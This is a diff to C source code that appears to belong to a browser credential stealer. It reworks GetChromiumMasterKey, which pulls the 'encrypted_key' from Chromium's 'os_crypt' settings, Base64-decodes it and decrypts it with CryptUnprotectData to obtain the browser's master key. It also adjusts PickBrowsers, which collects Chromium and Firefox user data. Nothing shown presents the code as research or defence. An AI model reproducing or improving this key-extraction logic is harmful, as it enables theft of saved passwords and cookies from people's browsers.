@@ -354,7 +354,7 @@ BOOL GetChromiumMasterKey
 	DWORD cbFileData = 0;
 	LPSTR lpTemp = NULL;
 	LPSTR lpEncodedKey = NULL;
-	PBYTE pEncryptedKey = NULL;
+	PBUFFER pEncryptedKey = NULL;
 	DWORD cbEncryptedKey = 0;
 	DATA_BLOB InputBlob;
 	DATA_BLOB OutputBlob;
@@ -367,15 +367,16 @@ BOOL GetChromiumMasterKey
 			lpTemp = StrStrA(pFileData, "\"os_crypt\":");
 			if (lpTemp != NULL) {
 				lpEncodedKey = SearchMatchStrA(lpTemp, "\"encrypted_key\":\"", "\"},\"");
-				pEncryptedKey = Base64Decode(lpEncodedKey, &cbEncryptedKey);
-				InputBlob.pbData = &pEncryptedKey[5];
-				InputBlob.cbData = cbEncryptedKey - 5;
+				pEncryptedKey = Base64Decode(lpEncodedKey);
+				InputBlob.pbData = &pEncryptedKey->pBuffer[5];
+				InputBlob.cbData = pEncryptedKey->cbBuffer - 5;
 				if (!CryptUnprotectData(&InputBlob, NULL, NULL, NULL, NULL, 0, &OutputBlob)) {
 					LOG_ERROR("CryptUnprotectData", GetLastError());
 					goto CLEANUP;
 				}
 
 				pUserData->pMasterKey = ALLOC(OutputBlob.cbData);
+				pUserData->cbMasterKey = OutputBlob.cbData;
 				memcpy(pUserData->pMasterKey, OutputBlob.pbData, OutputBlob.cbData);
 				LocalFree(OutputBlob.pbData);
 			}
@@ -384,7 +385,7 @@ BOOL GetChromiumMasterKey
 
 CLEANUP:
 	FREE(lpEncodedKey);
-	FREE(pEncryptedKey);
+	FreeBuffer(pEncryptedKey);
 	FREE(pFileData);
 
 	return Result;
@@ -399,7 +400,7 @@ PUSER_DATA* PickBrowsers
 	PUSER_DATA pFireFoxData = NULL;
 	DWORD dwNumberOfUserDatas = 0;
 
-	pResult = PickChromium(&dwNumberOfUserDatas);
+	//pResult = PickChromium(&dwNumberOfUserDatas);
 	pFireFoxData = PickFireFox();
 	if (pFireFoxData != NULL) {
 		if (pResult != NULL) {
@@ -407,7 +408,8 @@ PUSER_DATA* PickBrowsers
 			pResult[dwNumberOfUserDatas++] = pFireFoxData;
 		}
 		else {
-			pResult = pFireFoxData;
+			pResult = ALLOC(sizeof(PUSER_DATA));
+			pResult[0] = pFireFoxData;
 			dwNumberOfUserDatas = 1;
 		}
 	}
